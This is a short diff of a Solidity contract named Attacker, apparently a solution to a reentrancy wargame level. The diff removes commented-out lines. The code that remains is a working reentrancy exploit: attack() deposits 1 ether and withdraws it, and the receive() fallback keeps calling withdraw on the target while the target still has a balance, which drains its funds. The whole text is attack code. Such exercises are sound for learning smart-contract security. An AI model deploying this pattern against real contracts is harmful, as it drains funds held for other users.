@@ -39,10 +39,7 @@ contract Attacker {
     }
 
     function attack() external {
-        // require(msg.value >= 1 ether, "Need at least 1 ether to attack");
-
         reentrance.donate{value: 1 ether}(address(this));
-
         reentrance.withdraw(1 ether);
     }
 
@@ -54,9 +51,6 @@ contract Attacker {
     // }
 
     receive() external payable {
-        //  if (address(reentrance).balance > 0 ether) {
-        //     reentrance.withdraw(address(this).balance);
-        // }
         if (address(reentrance).balance > 0 ether) {
             reentrance.withdraw(1 ether);
         }
